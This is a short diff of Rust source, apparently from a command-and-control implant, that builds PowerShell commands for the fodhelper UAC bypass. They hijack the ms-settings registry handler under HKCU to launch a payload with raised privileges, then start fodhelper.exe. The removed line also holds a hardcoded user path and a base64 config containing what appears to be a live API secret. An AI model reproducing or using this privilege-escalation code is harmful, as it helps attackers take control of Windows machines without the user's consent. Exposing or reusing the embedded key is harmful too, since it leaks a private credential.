@@ -88,8 +88,7 @@ pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<St
                                 let cmds = vec![
                                     format!(r#"New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force"#),
                                     format!(r#"New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force"#),
-                                    //format!(r#"Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "{persist_path} -b {encoded_config}" -Force"#),
-                                    format!(r#"Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Users\Matt\AppData\Roaming\notion.exe -b eyJzbGVlcF9pbnRlcnZhbCI6NSwiaml0dGVyX3RpbWUiOjAsInBhcmVudF9wYWdlX2lkIjoiN2QzYTRiMmVhMDk0NDJjMDg3YTFkMGI0Y2UwOGVlYWUiLCJhcGlfa2V5Ijoic2VjcmV0X1ZOcDRTV1NUUWNGZUM0VzB4Vm9Ob1dJSWY1ZGZ0UWxwRWRrNnhpcWc5OVMiLCJjb25maWdfZmlsZV9wYXRoIjoiY29uZmlnLmpzb24iLCJsYXVuY2hfYXBwIjpmYWxzZSwibG9nX2xldmVsIjo0fQ==" -Force"#),
+                                    format!(r#"Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "{persist_path} -b {encoded_config}" -Force"#),
                                     format!(r#"Start-Process "C:\Windows\System32\fodhelper.exe""#)
                                 ];
 
